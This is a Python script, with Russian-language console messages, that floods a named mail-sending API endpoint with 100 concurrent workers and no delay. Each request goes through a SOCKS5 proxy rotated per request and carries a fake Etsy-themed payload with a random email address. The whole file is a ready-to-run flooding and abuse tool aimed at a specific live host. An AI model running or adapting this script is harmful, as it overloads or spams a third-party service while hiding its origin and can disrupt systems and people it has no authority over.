import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
import signal
import time
from datetime import datetime
import random

BASE_URL = "https://mailer.hype-interface.com"
CONCURRENCY = 100
DELAY_SECONDS = 0
PER_REQUEST_TIMEOUT = 10
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
}

endpoints = [
    {"path": "/api/v2/send_mail", "method": "POST"}
]

stop_event = asyncio.Event()

def _on_signal(signame):
    print(f"\n[{datetime.utcnow().isoformat()}] Получен сигнал {signame}. Завершаюсь...")
    stop_event.set()

for s in ("SIGINT", "SIGTERM"):
    try:
        signum = getattr(signal, s)
        signal.signal(signum, lambda sig, frame, s=s: _on_signal(s))
    except Exception:
        pass

def make_payload():
    uid = random.randint(100000, 999999)
    return {
        "api_key": "0w0",
        "title": "Приветик!",
        "price": 123,
        "name": "пупупу)",
        "photo": "",
        "url": f"https://ETSYSUPER283284742.com/product/123",
        "email": f"123{uid}@gmail.com",
        "country_code": "EU",
        "service_code": "ETSY",
        "template": "20",
        "user_id": "1337"
    }

async def send_once(session, endpoint):
    url = BASE_URL.rstrip("/") + endpoint["path"]
    entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "url": url,
        "method": endpoint["method"],
        "status": None,
        "response_text": None,
        "error": None,
        "elapsed": None
    }
    start = time.time()
    try:
        if endpoint["method"].upper() == "GET":
            async with session.get(url, headers=HEADERS, timeout=PER_REQUEST_TIMEOUT) as resp:
                text = await resp.text()
                entry["status"] = resp.status
                entry["response_text"] = text
        elif endpoint["method"].upper() == "POST":
            payload = make_payload()
            async with session.post(url, json=payload, headers=HEADERS, timeout=PER_REQUEST_TIMEOUT) as resp:
                text = await resp.text()
                entry["status"] = resp.status
                entry["response_text"] = text
        else:
            entry["error"] = f"Unsupported method: {endpoint['method']}"
    except Exception as e:
        entry["error"] = repr(e)
    finally:
        entry["elapsed"] = round(time.time() - start, 3)
    return entry

async def worker(worker_id, session):
    iteration = 0
    while not stop_event.is_set():
        iteration += 1
        for ep in endpoints:
            entry = await send_once(session, ep)
            snippet = entry.get("response_text") or entry.get("error")
            print(f"[{entry['timestamp']}] worker#{worker_id} iter#{iteration} {ep['method']} {ep['path']} -> "
                  f"{entry.get('status') or 'ERR'} | Response: {snippet}\n")
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=DELAY_SECONDS)
            break
        except asyncio.TimeoutError:
            continue

async def main():
    proxy_url = 'socks5://'     #vproxy @V_Proxy_bot ( TG keep use rotation per req)
    connector = ProxyConnector.from_url(proxy_url, limit_per_host=CONCURRENCY, ssl=False)
    timeout = aiohttp.ClientTimeout(total=None)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [asyncio.create_task(worker(i + 1, session)) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt — завершаюсь.")
